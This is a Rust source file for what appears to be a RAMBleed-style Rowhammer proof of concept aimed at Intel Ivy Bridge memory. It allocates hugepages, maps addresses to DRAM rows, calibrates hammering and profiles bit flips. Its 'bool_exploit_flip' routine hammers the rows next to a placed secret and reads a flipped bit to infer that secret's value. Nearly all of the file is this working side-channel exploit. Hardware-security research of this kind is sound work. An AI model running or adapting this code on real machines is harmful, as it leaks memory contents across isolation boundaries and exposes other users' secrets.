#![feature(try_trait)]
#![feature(asm)]

mod architecture;
mod config;
mod intelivy;
mod alloc;
mod memmap;
mod profile;
mod hammer;

use crate::architecture::{DramAddr, Architecture};
use crate::profile::Direction::{From1To0, From0To1};
use crate::config::Config;
use crate::intelivy::IntelIvy;
use crate::profile::Flip;
use crate::memmap::{MemMap, offset_to_dram, DramRange};
use crate::alloc::{contig_mem_diff, alloc_2mb_buddy, alloc_2mb_hugepage, alloc_1gb_hugepage};
use crate::hammer::{hammer, reads_per_refresh};
use crate::profile::profile_ranges;
use vm_info::page_size;
use crate::alloc::virt_to_phys;

const _READ_MULTIPLICATOR: usize = 2;

// place the secret at buf + offset by unmapping part of buf
fn place_secret(buf: &mut MemMap, offset: usize, c: &Config) -> Result<(), String> {
    // place the secret at buf + offset by unmapping part of buf
    // POC here
    buf[offset] = 0xff;
    let dram_secret = offset_to_dram(offset, c);

    // remove address from the row
    let row_ranges = same_row_ranges(buf, dram_secret.clone()).ok_or("No ranges")?;
    let mut row_ranges_new = Vec::new();
    for r in row_ranges {
        let start_offset = c.arch.dram_to_phys(&r.start.clone());
        if start_offset < offset && offset >= start_offset + r.bytes {
            row_ranges_new.push(r.clone());
        } else {
            let r1 = DramRange { start: r.start.clone(), bytes: start_offset - offset };
            if r1.bytes > 0 {
                row_ranges_new.push(r1);
            }
            let r2 = DramRange {
                start: offset_to_dram(offset + 1, c),
                bytes: r.bytes - (start_offset - offset) - 1,
            };
            if r2.bytes > 0 {
                row_ranges_new.push(r2);
            }
        }
    }

    buf.range_map.insert(dram_secret.to_row_index(),
                         row_ranges_new);
    Ok(())
}

fn same_row_ranges(buf: &MemMap, da: DramAddr) -> Option<&Vec<DramRange>> {
    buf.range_map.get(&da.to_row_index())
}

// find an address in the row as buf + offset that is mapped in buf
fn same_row_addr(buf: &MemMap, offset: usize, c: &Config) -> Option<usize> {
    //let offset_aligned = offset - offset % page_size().unwrap_or(4096);
    let da = offset_to_dram(offset, c);
    let ranges = same_row_ranges(buf, da)?;
    if ranges.is_empty() {
        None
    } else {
        Some(c.arch.dram_to_phys(&ranges[0].start))
    }
}

fn read_sidechannel(buf: &MemMap, flip: &Flip, _c: &Config) -> Option<bool> {
    let flip_byte = buf[flip.offset];
    let flip_bit = flip_byte & (1 << flip.bit) != 0;
    // hammering makes the vulnerable bit equal its neighbors
    Some(flip_bit)
}

fn fill_victim(buf: &mut MemMap, flip: &Flip, _c: &Config) {
    buf[flip.offset] = match flip.dir {
        From0To1 => 0x00,
        From1To0 => 0xff,
    };
}

// buf is 2MB-aligned
fn bool_exploit_flip(buf: &mut MemMap, flip: &Flip, c: &Config) -> Option<bool> {
    let secret_above = offset_above(buf, flip.offset, c)?;
    let secret_below = offset_below(buf, flip.offset, c)?;
    place_secret(buf, align_page_offset(secret_above), c).ok()?;
    place_secret(buf, align_page_offset(secret_below), c).ok()?;
    let aggressor_above = same_row_addr(buf, secret_above, c)?;
    let aggressor_below = same_row_addr(buf, secret_below, c)?;

    //Fill flip address according to flip.dir
    fill_victim(buf, flip, c);

    hammer(&buf[aggressor_above],
           &buf[aggressor_below],
           c.reads_per_hammer);

    read_sidechannel(buf, flip, c)
}

fn align_page_offset(offset: usize) -> usize {
    let page_size = page_size().unwrap_or(4096);
    offset - offset % page_size
}

// return offset of the address in the row above buf + offset
fn offset_above(_buf: &MemMap, offset: usize, c: &Config) -> Option<usize> {
    let mut dram_addr = offset_to_dram(offset, c);
    if dram_addr.row == 0 {
        return None;
    }
    dram_addr.row -= 1;
    Some(c.arch.dram_to_phys(&dram_addr))
}

// return offset of the address in the row below buf + offset
fn offset_below(_buf: &MemMap, offset: usize, c: &Config) -> Option<usize> {
    let mut dram_addr = offset_to_dram(offset, c);
    // TODO: return None if dram_addr.row = c.MAX_ROW?
    //if dram_addr.row == unimplemented!() {
    //    return None
    //}
    dram_addr.row += 1;
    Some(c.arch.dram_to_phys(&dram_addr))
}

fn template_2mb_contig(mem: &MemMap, c: &Config) -> Vec<Flip> {
    let mut flips = vec![];
    // iterate over map, hammer
    for ((chan, dimm,rank, bank, row), rs) in mem.range_map.iter() {
        if *row == 0 || *row == std::u16::MAX {
            continue;
        }
        
        let row_above = match mem.range_map.get(&(*chan, *dimm, *rank, *bank, *row - 1)) {
            Some(r) => r,
            None => continue,
        };
        let row_below = match mem.range_map.get(&(*chan, *dimm,*rank, *bank, *row + 1)) {
            Some(r) => r,
            None => continue,
        };

        println!("({}, {}, {}, {}): row {}", rs[0].start.chan, rs[0].start.dimm, rs[0].start.rank, rs[0].start.bank, rs[0].start.row);
        flips.append(profile_ranges(mem, row_above, row_below, rs, 0x00, c).as_mut());
        flips.append(profile_ranges(mem, row_above, row_below, rs, 0xff, c).as_mut());
    }

    flips
}

fn test_contig_mem_diff(c : &Config) {
    let mem_attack = alloc_1gb_hugepage(c).unwrap();
    println!("Allocated memory successfully at {:?}", mem_attack.buf);
    let start_p = virt_to_phys(mem_attack.buf).unwrap();
    print!("phys: {:X}", start_p);
    //let end_p = virt_to_phys(unsafe { mem_attack.add(2 * 1<<20 - 1) }).unwrap();
    //assert_eq!(start_p + 2 * 1<<20 - 1, end_p)
}

pub fn test_alloc(c : &Config) {
    contig_mem_diff(c);
}

pub fn test_template(c : &Config) {
    let mem_attack = alloc_2mb_buddy(&c).unwrap();
    let flips = template_2mb_contig(&mem_attack, &c);
    println!("Found flips: {:?}", flips)
}

pub fn test_rambleed() {
    let c: Config = Config{
        aligned_bits: 20,
        reads_per_hammer: 100,
        contiguous_dram_addr: 0,
        arch: Box::new(IntelIvy {
            dual_channel: false,
            dual_dimm: false,
            dual_rank: true
        }) };
    let mut mem_attack = alloc_2mb_buddy(&c).unwrap();
    let flips = template_2mb_contig(&mem_attack, &c);
    for f in flips {
        let val = bool_exploit_flip(&mut mem_attack, &f, &c);
        println!("Secret value is {:?}", val);
    }
}

fn row_conflict_pair(mem : &MemMap) -> Option<(DramAddr, DramAddr)> {
    for ((c1, d1, r1, b1, row1), a1s) in mem.range_map.iter() {
        let a1 = a1s.get(0);
        let a2 : Option<&DramRange> = mem.range_map.iter().filter(
            |((c2, d2, r2, b2, row2), a2s)|
                        c1 == c2 && d1 == d2 && r1 == r2 && b1 == b2 && row1 != row2 && !a2s.is_empty())
            .map(|(_, a2s)| &a2s[0]).next();

        match (a1, a2) {
            (None, _) => continue,
            (_, None) => continue,
            (Some(a1), Some (a2)) => return Some ((a1.start.clone(), a2.start.clone())),
        }
    }

    None
}

fn calibrate<T : Architecture>(mem : &MemMap, a : T) -> usize{
    let (a1, a2) = row_conflict_pair(mem).expect("No row conflict pair found! Calibration failed");
    let a1 = mem.buf.wrapping_add(a.dram_to_phys(&a1));
    let a2 = mem.buf.wrapping_add(a.dram_to_phys(&a2));
    3*reads_per_refresh(a1, a2, a.refresh_period())
}

fn main() {
    let arch = IntelIvy {
        dual_channel: false,
        dual_dimm: false,
        dual_rank: true
    };
    let mut c: Config = Config{
        aligned_bits: 20,
        reads_per_hammer: 0,
        contiguous_dram_addr: 1<<12,
        arch : Box::new(arch.clone()),
        };

    let mem_attack = alloc_2mb_hugepage(&c)
        .expect("Failed to allocate memory using hugepages");

    println!("Allocated memory successfully at {:?}", mem_attack.buf);
    let start_p = virt_to_phys(mem_attack.buf).unwrap_or(std::usize::MAX);
    println!("Physical address: {:p}", start_p as *const usize);

    c.reads_per_hammer = calibrate(&mem_attack, arch);
    println!("Calibrated to {} iterations per hammering", c.reads_per_hammer);
    let flips = template_2mb_contig(&mem_attack, &c);
    println!("Found the following flips {:?}", flips);
    //contig_mem_diff(mem, c);
    //println!("{:#?}", offset_to_dram(0, &c));
    //println!("{:#?}", offset_to_dram(1002000, &c));
    //println!("{:#?}", mem_attack);
    //contig_mem_diff(&c);
}
